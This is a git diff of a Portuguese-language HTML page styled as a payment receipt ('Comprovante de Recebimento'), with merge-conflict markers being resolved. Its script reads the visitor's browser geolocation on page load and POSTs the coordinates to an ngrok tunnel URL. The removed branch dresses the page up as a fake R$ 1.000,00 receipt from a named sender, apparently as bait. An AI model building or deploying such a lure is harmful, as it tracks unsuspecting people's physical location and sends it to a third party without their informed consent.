@@ -8,30 +8,8 @@
   <link rel="stylesheet" href="styles.css" />
 </head>
 
-<<<<<<< HEAD
 <body style="background-color: antiquewhite;">
   <h1>Comprovante</h1>
-=======
-<body>
-  <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
-    </div>
-
-    <button class="botao" onclick="window.print()">Imprimir</button>
-
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
-    </div>
-
-  </div>
->>>>>>> c049881caf60e7901ca4b11fd3f7e2a3a9cdbb9f
 
   <script>
     window.addEventListener("load", () => {
@@ -58,15 +36,11 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-<<<<<<< HEAD
       // console.log("Latitude: " + latitude);
       // console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
       fetch("https://48b8-2804-7f0-bb41-46f3-9853-615a-e14b-3c18.ngrok-free.app/receber-localizacao", {
-=======
-      fetch("NGROK_SERVER/send-location", {
->>>>>>> c049881caf60e7901ca4b11fd3f7e2a3a9cdbb9f
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -75,7 +49,6 @@
       })
         .then(response => response.json())
         .then(data => {
-<<<<<<< HEAD
           if (data.success) {
             alert("Localização enviada com sucesso!");
           } else {
@@ -83,12 +56,6 @@
           }
         })
 
-=======
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
->>>>>>> c049881caf60e7901ca4b11fd3f7e2a3a9cdbb9f
         .catch(error => {
           console.error("Erro:", error);
         });
